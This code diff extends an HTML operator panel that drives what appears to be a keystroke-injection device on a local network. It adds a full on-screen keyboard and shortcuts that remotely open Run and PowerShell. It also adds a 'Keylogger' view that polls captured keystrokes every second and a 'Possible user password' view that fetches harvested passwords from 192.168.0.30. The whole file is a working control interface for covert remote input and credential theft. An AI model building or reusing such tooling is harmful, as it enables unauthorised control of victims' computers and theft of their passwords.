@@ -20,6 +20,20 @@
         gap: 8px;
     }
 
+    .key {
+        margin: 2px;
+        padding: 12px 10px;
+        border-radius: 6px;
+        border: 1px solid #555;
+        background-color: #444;
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+    }
+    .key:active {
+        background-color: #666;
+    }
+
     button {
         background: #444;
         color: white;
@@ -47,6 +61,32 @@
         border-radius: 6px;
         border: none;
     }
+    #fileContent {
+        background: #111;
+        border: 1px solid #444;
+        padding: 15px;
+        margin-top: 30px;
+        width: 80%;
+        height: 250px;
+        margin-left: auto;
+        margin-right: auto;
+        overflow-y: scroll;
+        text-align: left;
+        white-space: pre-wrap;
+    }
+    #fileContent2 {
+        background: #111;
+        border: 1px solid #444;
+        padding: 15px;
+        margin-top: 30px;
+        width: 80%;
+        height: 250px;
+        margin-left: auto;
+        margin-right: auto;
+        overflow-y: scroll;
+        text-align: left;
+        white-space: pre-wrap;
+    }
 </style>
 </head>
 <body>
@@ -61,33 +101,75 @@
     </button>
 </div>
 
-<h2>Letter Keys</h2>
-<div class="keyboard">
-    <script>
-        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
-        letters.forEach(letter => {
-            document.write(`<button onclick="sendKey('${letter}')">${letter}</button>`);
-        });
-    </script>
-</div>
+<h2>Full Keyboard</h2>
+<div class="keyboard" id="keyboard"></div>
 
-<h2>Word Buttons</h2>
+<script>
+const keyboardLayout = [
+    ["`", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "Backspace"],
+    ["Tab", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "\\"],
+    ["CapsLock", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "Enter"],
+    ["Shift", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "Shift"],
+    ["Ctrl", "Win", "Alt", "Space", "Alt", "Win", "Menu", "Ctrl"]
+];
+
+const keyboardContainer = document.getElementById("keyboard");
+
+keyboardLayout.forEach(row => {
+    const rowDiv = document.createElement("div");
+    rowDiv.style.display = "flex";
+    rowDiv.style.justifyContent = "center";
+    rowDiv.style.marginBottom = "5px";
+
+    row.forEach(key => {
+        const keyBtn = document.createElement("button");
+        keyBtn.innerText = key;
+        keyBtn.className = "key";
+
+        // Make wide keys wider
+        if (["Backspace", "Enter", "Shift", "CapsLock", "Space"].includes(key)) {
+            keyBtn.style.flex = key === "Space" ? "6" : "2";
+        } else {
+            keyBtn.style.flex = "1";
+        }
+
+        keyBtn.onclick = () => sendKey(key);
+        rowDiv.appendChild(keyBtn);
+    });
+
+    keyboardContainer.appendChild(rowDiv);
+});
+</script>
+
+<h2>Shortcuts</h2>
 <div class="words">
     <button onclick="sendKey('[windows]')">Windows</button>
     <button onclick="sendKey('[run]')">Run</button>
-    <button onclick="sendKey('powershell.exe')">"powershell.exe"</button>
-    <button onclick="sendKey('ctrl_alt_del')">Ctrl+Alt+Del</button>
-    <button onclick="sendKey('copy')">Copy</button>
-    <button onclick="sendKey('paste')">Paste</button>
+    <button onclick="runPS()">"PowerShell"</button>
+    <button onclick="cloneDisplay()">Clone display</button>
     <button onclick="sendKey('[enter]')">Enter</button>
-    <button onclick="sendKey('escape')">Esc</button>
+    <button onclick="sendKey('[esc]')">Esc</button>
     <button onclick="sendKey('[tab]')">Tab</button>
+    <p>
+	    <button onclick="sendKey('[taskbar1]')">Taskbar icon #1</button>
+	    <button onclick="sendKey('[taskbar2]')">Taskbar icon #2</button>
+	    <button onclick="sendKey('[taskbar3]')">Taskbar icon #3</button>
+	    <button onclick="sendKey('[taskbar4]')">Taskbar icon #4</button>
+	    <button onclick="sendKey('[taskbar5]')">Taskbar icon #5</button>
+	    <button onclick="sendKey('[taskbar6]')">Taskbar icon #6</button>
+    </p>
 </div>
+
+<h2>Keylogger</h2>
+<div id="fileContent">Loading...</div>
+
+<h3>Possible user password</h3>
+<div id="fileContent2">Loading...</div>
 
 <script>
 function sendKey(key) {
     console.log("sending key: ",key);
-    fetch("http://localhost:8080/command", {
+    fetch("http://192.168.0.30:8080/command", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ key })
@@ -95,6 +177,51 @@ function sendKey(key) {
         console.log("Sent:", key);
     }).catch(err => console.error(err));
 }
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function cloneDisplay() {
+    await sendKey('[run]');
+    await sleep(1000);
+    await sendKey('DisplaySwitch.exe /clone');
+}
+
+async function runPS() {
+    await sendKey('[run]');
+    await sleep(1000);
+    await sendKey('powershell');
+}
+
+function updateFile() {
+    fetch("http://192.168.0.30:8000/output.txt")  // <-- change name if needed
+        .then(response => response.text())
+        .then(text => {
+            document.getElementById("fileContent").textContent = text;
+        })
+        .catch(err => {
+            document.getElementById("fileContent").textContent = 
+                "Error loading file: " + err;
+        });
+}
+
+function updatePasswordFile() {
+    fetch("http://192.168.0.30:8000/password.txt")  // <-- change name if needed
+        .then(response => response.text())
+        .then(text => {
+            document.getElementById("fileContent2").textContent = text;
+        })
+        .catch(err => {
+            document.getElementById("fileContent2").textContent = 
+                "Error loading file: " + err;
+        });
+}
+
+setInterval(updateFile, 1000); // every second
+setInterval(updatePasswordFile, 1000*60); // every 1min
+updateFile(); // initial load
+updatePasswordFile();
 </script>
 
 </body>
